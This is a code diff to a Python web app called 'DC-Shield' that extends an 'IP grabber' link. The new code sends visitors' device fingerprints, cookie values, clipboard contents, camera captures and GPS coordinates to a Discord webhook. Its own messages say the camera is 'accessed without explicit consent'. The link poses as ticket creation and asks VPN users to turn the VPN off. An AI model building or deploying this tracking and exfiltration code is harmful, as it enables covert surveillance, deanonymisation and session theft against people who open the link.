@@ -179,13 +179,14 @@ def extract_device_info(request_obj):
 
     return device_info
 
-def send_to_channel(message:str, embed_data=None):
+def send_to_channel(message:str, embed_data=None, components=None):
     """
-    Sends a message using Discord webhook with optional embed support.
+    Sends a message using Discord webhook with optional embed support and components.
 
     Args:
     - message (str): The message to send.
     - embed_data (dict): Optional embed data for rich formatting.
+    - components (list): Optional components (buttons) for interactivity.
 
     Returns:
     - bool: True if the message was sent successfully, False otherwise.
@@ -201,6 +202,8 @@ def send_to_channel(message:str, embed_data=None):
         }
         if message:
             payload["content"] = message
+        if components:
+            payload["components"] = components
     else:
         payload = {
             "content": message
@@ -232,7 +235,7 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
         "color": 0xff4757,  # Red color
         "timestamp": datetime.now().isoformat(),
         "thumbnail": {
-            "url": "https://cdn.discordapp.com/emojis/1234567890.png"  # You can add a warning icon URL
+            "url": "https://cdn.discordapp.com/emojis/454652220064006147.gif"  # You can add a warning icon URL
         },
         "fields": [
             {
@@ -247,13 +250,13 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
             }
         ],
         "footer": {
-            "text": "DC-Shield Security System",
-            "icon_url": "https://cdn.discordapp.com/emojis/shield.png"
+            "text": "DC-Shield Security System • Click button for full details",
+            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png"
         }
     }
 
     if device_info:
-        # Add device information fields
+        # Add device information fields (summarized)
         device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
         device_value += f"**OS:** {device_info['os_family']} {device_info['os_version']}\n"
         device_value += f"**Device:** {device_info['device_family']}"
@@ -269,7 +272,7 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
             "inline": True
         })
 
-        # Network details
+        # Network details (summarized)
         network_value = f"**Language:** {device_info['accept_language'][:30]}...\n"
         network_value += f"**Referer:** {device_info['referer'][:50]}...\n"
         network_value += f"**Time:** {device_info['access_time']}"
@@ -307,12 +310,12 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
             }
         ],
         "footer": {
-            "text": "DC-Shield IP Intelligence",
+            "text": "DC-Shield IP Intelligence • Click button for full details",
             "icon_url": "https://cdn.discordapp.com/emojis/globe.png"
         }
     }
 
-    # Device information
+    # Device information (summarized)
     device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
     device_value += f"**OS:** {device_info['os_family']} {device_info['os_version']}\n"
     device_value += f"**Device:** {device_info['device_family']}"
@@ -328,7 +331,7 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
         "inline": False
     })
 
-    # Cookie and tracking information
+    # Cookie and tracking information (summarized)
     if device_info['cookie_count'] > 0:
         cookie_value = f"**Total Cookies:** {device_info['cookie_count']}\n"
         cookie_value += f"**Session Cookies:** {'⚠️ Yes' if device_info['has_session_cookies'] else '✅ No'}\n"
@@ -340,7 +343,7 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
             "inline": True
         })
 
-    # Hardware information
+    # Hardware information (summarized)
     if device_info['sec_ch_device_memory'] != 'Unknown' or device_info['sec_ch_dpr'] != 'Unknown':
         hardware_value = ""
         if device_info['sec_ch_device_memory'] != 'Unknown':
@@ -357,7 +360,7 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
                 "inline": True
             })
 
-    # Network performance
+    # Network performance (summarized)
     network_perf = ""
     if device_info['sec_ch_downlink'] != 'Unknown':
         network_perf += f"**Speed:** {device_info['sec_ch_downlink']} Mbps\n"
@@ -377,6 +380,448 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
         "value": f"[View detailed IP analysis](https://iplocation.com/?ip={ip_address})",
         "inline": False
     })
+
+    return embed
+
+def create_verbose_embed(device_info, event_type="IP_GRABBER"):
+    """
+    Create a verbose embed with all detailed information.
+    """
+    embed = {
+        "title": f"📋 VERBOSE {event_type} DETAILS",
+        "description": "Complete device and network fingerprint analysis",
+        "color": 0x2f3542,  # Dark gray color
+        "timestamp": datetime.now().isoformat(),
+        "fields": [],
+        "footer": {
+            "text": "DC-Shield Detailed Analysis System",
+            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png"
+        }
+    }
+
+    # Browser Details
+    browser_details = f"**Family:** {device_info['browser_family']}\n"
+    browser_details += f"**Version:** {device_info['browser_version']}\n"
+    browser_details += f"**User Agent:** {device_info['user_agent_string'][:100]}..."
+
+    embed["fields"].append({
+        "name": "🌐 Browser Details",
+        "value": browser_details,
+        "inline": False
+    })
+
+    # Operating System
+    os_details = f"**Family:** {device_info['os_family']}\n"
+    os_details += f"**Version:** {device_info['os_version']}\n"
+    if device_info['sec_ch_ua_platform'] != 'Unknown':
+        os_details += f"**Platform:** {device_info['sec_ch_ua_platform']}\n"
+    if device_info['sec_ch_ua_platform_version'] != 'Unknown':
+        os_details += f"**Platform Version:** {device_info['sec_ch_ua_platform_version']}"
+
+    embed["fields"].append({
+        "name": "💻 Operating System",
+        "value": os_details,
+        "inline": True
+    })
+
+    # Hardware Specifications
+    hardware_specs = ""
+    if device_info['sec_ch_device_memory'] != 'Unknown':
+        hardware_specs += f"**RAM:** {device_info['sec_ch_device_memory']} GB\n"
+    if device_info['sec_ch_ua_arch'] != 'Unknown':
+        hardware_specs += f"**Architecture:** {device_info['sec_ch_ua_arch']}\n"
+    if device_info['sec_ch_ua_bitness'] != 'Unknown':
+        hardware_specs += f"**Bitness:** {device_info['sec_ch_ua_bitness']}-bit\n"
+    if device_info['sec_ch_ua_wow64'] != 'Unknown':
+        hardware_specs += f"**WoW64:** {device_info['sec_ch_ua_wow64']}\n"
+    if device_info['sec_ch_dpr'] != 'Unknown':
+        hardware_specs += f"**Device Pixel Ratio:** {device_info['sec_ch_dpr']}"
+
+    if hardware_specs:
+        embed["fields"].append({
+            "name": "⚙️ Hardware Specifications",
+            "value": hardware_specs,
+            "inline": True
+        })
+
+    # Network Information
+    network_info = f"**Accept-Language:** {device_info['accept_language']}\n"
+    network_info += f"**Accept-Encoding:** {device_info['accept_encoding']}\n"
+    if device_info['sec_ch_downlink'] != 'Unknown':
+        network_info += f"**Download Speed:** {device_info['sec_ch_downlink']} Mbps\n"
+    if device_info['sec_ch_rtt'] != 'Unknown':
+        network_info += f"**Round Trip Time:** {device_info['sec_ch_rtt']}ms\n"
+    if device_info['sec_ch_ect'] != 'Unknown':
+        network_info += f"**Effective Connection Type:** {device_info['sec_ch_ect']}"
+
+    embed["fields"].append({
+        "name": "🌍 Network Information",
+        "value": network_info,
+        "inline": False
+    })
+
+    # Cookie Analysis
+    if device_info['cookie_count'] > 0:
+        cookie_analysis = f"**Total Count:** {device_info['cookie_count']}\n"
+        cookie_analysis += f"**Has Session Cookies:** {'Yes' if device_info['has_session_cookies'] else 'No'}\n"
+        cookie_analysis += f"**Has Tracking Cookies:** {'Yes' if device_info['has_tracking_cookies'] else 'No'}\n"
+
+        # List first few cookies
+        if device_info['cookies']:
+            cookie_analysis += "**Sample Cookies:**\n"
+            for i, (name, value) in enumerate(list(device_info['cookies'].items())[:3]):
+                cookie_analysis += f"• `{name}`: {value[:30]}...\n"
+            if len(device_info['cookies']) > 3:
+                cookie_analysis += f"• ... and {len(device_info['cookies']) - 3} more"
+
+        embed["fields"].append({
+            "name": "🍪 Cookie Analysis",
+            "value": cookie_analysis,
+            "inline": True
+        })
+
+    # Privacy & Security Headers
+    privacy_info = ""
+    if device_info['dnt'] != 'Unknown':
+        privacy_info += f"**Do Not Track:** {device_info['dnt']}\n"
+    if device_info['sec_ch_prefers_color_scheme'] != 'Unknown':
+        privacy_info += f"**Color Scheme:** {device_info['sec_ch_prefers_color_scheme']}\n"
+    if device_info['sec_ch_prefers_reduced_motion'] != 'Unknown':
+        privacy_info += f"**Reduced Motion:** {device_info['sec_ch_prefers_reduced_motion']}\n"
+    if device_info['sec_ch_save_data'] != 'Unknown':
+        privacy_info += f"**Save Data:** {device_info['sec_ch_save_data']}"
+
+    if privacy_info:
+        embed["fields"].append({
+            "name": "🔒 Privacy & Preferences",
+            "value": privacy_info,
+            "inline": True
+        })
+
+    # Screen & Viewport
+    if device_info['sec_ch_viewport_width'] != 'Unknown' or device_info['sec_ch_viewport_height'] != 'Unknown':
+        viewport_info = ""
+        if device_info['sec_ch_viewport_width'] != 'Unknown':
+            viewport_info += f"**Width:** {device_info['sec_ch_viewport_width']}px\n"
+        if device_info['sec_ch_viewport_height'] != 'Unknown':
+            viewport_info += f"**Height:** {device_info['sec_ch_viewport_height']}px\n"
+        if device_info['sec_ch_dpr'] != 'Unknown':
+            viewport_info += f"**Pixel Ratio:** {device_info['sec_ch_dpr']}"
+
+        embed["fields"].append({
+            "name": "📱 Screen & Viewport",
+            "value": viewport_info,
+            "inline": True
+        })
+
+    # Request Metadata
+    metadata = f"**Method:** {device_info['method']}\n"
+    metadata += f"**Scheme:** {device_info['scheme']}\n"
+    metadata += f"**Path:** {device_info['path']}\n"
+    if device_info['query_string']:
+        metadata += f"**Query:** {device_info['query_string'][:50]}...\n"
+    metadata += f"**Content Type:** {device_info['content_type']}"
+
+    embed["fields"].append({
+        "name": "📄 Request Metadata",
+        "value": metadata,
+        "inline": False
+    })
+
+    return embed
+
+def create_verbose_button(event_id, event_type):
+    """
+    Create a button component for viewing verbose details.
+    """
+    return [
+        {
+            "type": 1,  # Action Row
+            "components": [
+                {
+                    "type": 2,  # Button
+                    "style": 1,  # Primary style (blue)
+                    "label": "📋 View Full Details",
+                    "emoji": {
+                        "name": "🔍"
+                    },
+                    "custom_id": f"verbose_{event_type}_{event_id}",
+                    "url": f"https://your-domain.com/verbose/{event_id}"  # You can replace with your actual domain
+                }
+            ]
+        }
+    ]
+
+# Global storage for device information (in production, use a database)
+device_data_store = {}
+advanced_data_store = {}
+
+@app.route('/api/collect-advanced-data', methods=['POST'])
+async def collect_advanced_data():
+    """
+    API endpoint to receive advanced browser data collection
+    """
+    try:
+        data = await request.get_json()
+
+        # Store the advanced data
+        timestamp = str(data.get('timestamp', int(datetime.now().timestamp())))
+        advanced_data_store[timestamp] = data
+
+        l.info(f'Advanced data collected: {len(data.get("data", {}))} categories')
+
+        # Send advanced data to Discord
+        await send_advanced_data_to_discord(data)
+
+        return jsonify({"status": "success"}), 200
+
+    except Exception as e:
+        l.error(f'Error collecting advanced data: {e}')
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+async def send_advanced_data_to_discord(collected_data):
+    """
+    Send advanced collected data to Discord with detailed analysis
+    """
+    try:
+        data = collected_data.get('data', {})
+
+        # Create comprehensive advanced data embed
+        embed = create_advanced_data_embed(data)
+        send_to_channel("🚨 **ADVANCED DATA INTERCEPTED** 🚨", embed)
+
+        # If camera was captured, send a separate embed with image
+        if data.get('camera', {}).get('captured'):
+            camera_embed = create_camera_embed(data['camera'])
+            send_to_channel("📸 **CAMERA ACCESS SUCCESSFUL** 📸", camera_embed)
+
+        # If GPS was captured, send location embed
+        if data.get('geolocation', {}).get('latitude'):
+            location_embed = create_location_embed(data['geolocation'])
+            send_to_channel("🌍 **GPS LOCATION ACQUIRED** 🌍", location_embed)
+
+    except Exception as e:
+        l.error(f'Error sending advanced data to Discord: {e}')
+
+def create_advanced_data_embed(data):
+    """
+    Create a comprehensive embed for advanced collected data
+    """
+    embed = {
+        "title": "🔥 ADVANCED SURVEILLANCE DATA",
+        "description": "**CRITICAL: Sensitive user data intercepted**",
+        "color": 0xff0000,  # Bright red for high alert
+        "timestamp": datetime.now().isoformat(),
+        "fields": [],
+        "footer": {
+            "text": "DC-Shield Advanced Intelligence System • CONFIDENTIAL",
+            "icon_url": "https://cdn.discordapp.com/emojis/warning.png"
+        }
+    }
+
+    # Screen & Display Information
+    if data.get('screen'):
+        screen_info = data['screen']
+        screen_value = f"**Resolution:** {screen_info.get('width')}x{screen_info.get('height')}\n"
+        screen_value += f"**Available:** {screen_info.get('availWidth')}x{screen_info.get('availHeight')}\n"
+        screen_value += f"**Color Depth:** {screen_info.get('colorDepth')} bits\n"
+        screen_value += f"**Orientation:** {screen_info.get('orientation')}"
+
+        embed["fields"].append({
+            "name": "🖥️ Display Configuration",
+            "value": screen_value,
+            "inline": True
+        })
+
+    # Timezone & Location Data
+    if data.get('timezone'):
+        tz_info = data['timezone']
+        tz_value = f"**Timezone:** {tz_info.get('name')}\n"
+        tz_value += f"**Offset:** {tz_info.get('offset')} minutes\n"
+        tz_value += f"**Locale:** {tz_info.get('locale')}\n"
+        tz_value += f"**Languages:** {', '.join(tz_info.get('languages', [])[:3])}"
+
+        embed["fields"].append({
+            "name": "🌐 Timezone & Locale",
+            "value": tz_value,
+            "inline": True
+        })
+
+    # Hardware Information
+    hardware_value = ""
+    if data.get('browser', {}).get('hardwareConcurrency'):
+        hardware_value += f"**CPU Cores:** {data['browser']['hardwareConcurrency']}\n"
+    if data.get('deviceMemory'):
+        hardware_value += f"**Device RAM:** {data['deviceMemory']} GB\n"
+    if data.get('memory'):
+        mem = data['memory']
+        hardware_value += f"**JS Heap Limit:** {mem.get('jsHeapSizeLimit', 0) // 1024 // 1024} MB\n"
+        hardware_value += f"**JS Heap Used:** {mem.get('usedJSHeapSize', 0) // 1024 // 1024} MB"
+
+    if hardware_value:
+        embed["fields"].append({
+            "name": "⚙️ Hardware Specifications",
+            "value": hardware_value,
+            "inline": False
+        })
+
+    # Battery Information (if available)
+    if data.get('battery') and not data['battery'].get('error'):
+        battery = data['battery']
+        battery_value = f"**Level:** {int(battery.get('level', 0) * 100)}%\n"
+        battery_value += f"**Charging:** {'Yes' if battery.get('charging') else 'No'}\n"
+        if battery.get('dischargingTime') != float('inf'):
+            battery_value += f"**Time Remaining:** {battery.get('dischargingTime', 0) // 60} minutes"
+
+        embed["fields"].append({
+            "name": "🔋 Battery Status",
+            "value": battery_value,
+            "inline": True
+        })
+
+    # Network Connection Details
+    if data.get('network') and not data['network'].get('error'):
+        network = data['network']
+        network_value = f"**Type:** {network.get('effectiveType', 'Unknown')}\n"
+        network_value += f"**Downlink:** {network.get('downlink', 'Unknown')} Mbps\n"
+        network_value += f"**RTT:** {network.get('rtt', 'Unknown')}ms\n"
+        network_value += f"**Data Saver:** {'On' if network.get('saveData') else 'Off'}"
+
+        embed["fields"].append({
+            "name": "📡 Network Connection",
+            "value": network_value,
+            "inline": True
+        })
+
+    # Media Devices
+    if data.get('mediaDevices') and not data['mediaDevices'].get('error'):
+        devices = data['mediaDevices']
+        device_count = {
+            'videoinput': 0,
+            'audioinput': 0,
+            'audiooutput': 0
+        }
+        for device in devices:
+            kind = device.get('kind', 'unknown')
+            if kind in device_count:
+                device_count[kind] += 1
+
+        media_value = f"**Cameras:** {device_count['videoinput']}\n"
+        media_value += f"**Microphones:** {device_count['audioinput']}\n"
+        media_value += f"**Speakers:** {device_count['audiooutput']}"
+
+        embed["fields"].append({
+            "name": "🎥 Media Devices",
+            "value": media_value,
+            "inline": True
+        })
+
+    # Storage Information
+    if data.get('storage') and not data['storage'].get('error'):
+        storage = data['storage']
+        storage_value = f"**Quota:** {storage.get('quota', 0) // 1024 // 1024 // 1024} GB\n"
+        storage_value += f"**Used:** {storage.get('usage', 0) // 1024 // 1024} MB"
+
+        embed["fields"].append({
+            "name": "💾 Storage Information",
+            "value": storage_value,
+            "inline": True
+        })
+
+    # Clipboard Data (if captured)
+    if data.get('clipboard') and not data['clipboard'].get('error'):
+        clipboard = data['clipboard']
+        clip_value = f"**Length:** {clipboard.get('length', 0)} characters\n"
+        clip_value += f"**Preview:** {clipboard.get('content', '')[:50]}..."
+
+        embed["fields"].append({
+            "name": "📋 Clipboard Contents",
+            "value": clip_value,
+            "inline": False
+        })
+
+    # Browser Fingerprints
+    if data.get('canvas'):
+        embed["fields"].append({
+            "name": "🎨 Canvas Fingerprint",
+            "value": "Canvas fingerprint captured (unique identifier)",
+            "inline": True
+        })
+
+    if data.get('webgl') and not data['webgl'].get('error'):
+        webgl = data['webgl']
+        webgl_value = f"**Vendor:** {webgl.get('vendor', 'Unknown')}\n"
+        webgl_value += f"**Renderer:** {webgl.get('renderer', 'Unknown')[:50]}..."
+
+        embed["fields"].append({
+            "name": "🎮 WebGL Information",
+            "value": webgl_value,
+            "inline": True
+        })
+
+    return embed
+
+def create_camera_embed(camera_data):
+    """
+    Create embed for captured camera image
+    """
+    embed = {
+        "title": "📸 CAMERA SURVEILLANCE SUCCESSFUL",
+        "description": "**ALERT: User camera accessed without explicit consent**",
+        "color": 0xff4757,
+        "timestamp": datetime.now().isoformat(),
+        "fields": [
+            {
+                "name": "📷 Capture Details",
+                "value": f"**Status:** Image captured successfully\n**Resolution:** 640x480\n**Timestamp:** {camera_data.get('timestamp')}",
+                "inline": False
+            },
+            {
+                "name": "🔍 Image Analysis",
+                "value": "Camera feed intercepted and stored for analysis. Image data available in base64 format.",
+                "inline": False
+            }
+        ],
+        "footer": {
+            "text": "DC-Shield Camera Intelligence • CLASSIFIED",
+        }
+    }
+
+    # Note: We're not including the actual image in Discord for privacy/legal reasons
+    # In a real scenario, this would be stored securely and referenced
+
+    return embed
+
+def create_location_embed(geo_data):
+    """
+    Create embed for GPS location data
+    """
+    embed = {
+        "title": "🌍 GPS LOCATION ACQUIRED",
+        "description": "**CRITICAL: Precise user location obtained**",
+        "color": 0xe74c3c,
+        "timestamp": datetime.now().isoformat(),
+        "fields": [
+            {
+                "name": "📍 Coordinates",
+                "value": f"**Latitude:** {geo_data.get('latitude')}\n**Longitude:** {geo_data.get('longitude')}\n**Accuracy:** ±{geo_data.get('accuracy')} meters",
+                "inline": True
+            },
+            {
+                "name": "🗺️ Location Details",
+                "value": f"**Altitude:** {geo_data.get('altitude') or 'Unknown'} m\n**Heading:** {geo_data.get('heading') or 'Unknown'}°\n**Speed:** {geo_data.get('speed') or 'Unknown'} m/s",
+                "inline": True
+            },
+            {
+                "name": "🔗 Map Link",
+                "value": f"[View on Google Maps](https://www.google.com/maps?q={geo_data.get('latitude')},{geo_data.get('longitude')})",
+                "inline": False
+            }
+        ],
+        "footer": {
+            "text": "DC-Shield GPS Intelligence • TOP SECRET",
+        }
+    }
 
     return embed
 
@@ -511,9 +956,18 @@ async def ip_grab(dc_handle):
         if device_info['sec_ch_device_memory'] != 'Unknown' or device_info['sec_ch_dpr'] != 'Unknown':
             hardware_info = f"\n⚙️ **Hardware Details:**\n• **Device Memory:** {device_info['sec_ch_device_memory']} GB\n• **Screen DPR:** {device_info['sec_ch_dpr']}\n• **Architecture:** {device_info['sec_ch_ua_arch']}"
 
-        # Create and send embed message
+        # Create and send embed message with button
+        event_id = str(int(datetime.now().timestamp()))
+        device_data_store[event_id] = device_info
+
         embed = create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info)
+
+        # Send initial summary embed, then follow up with verbose details
         send_to_channel(None, embed)
+
+        # Send verbose embed as follow-up message
+        verbose_embed = create_verbose_embed(device_info, "IP_GRABBER")
+        send_to_channel("📋 **Detailed Analysis:**", verbose_embed)
 
         if vpn:
             return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket.'
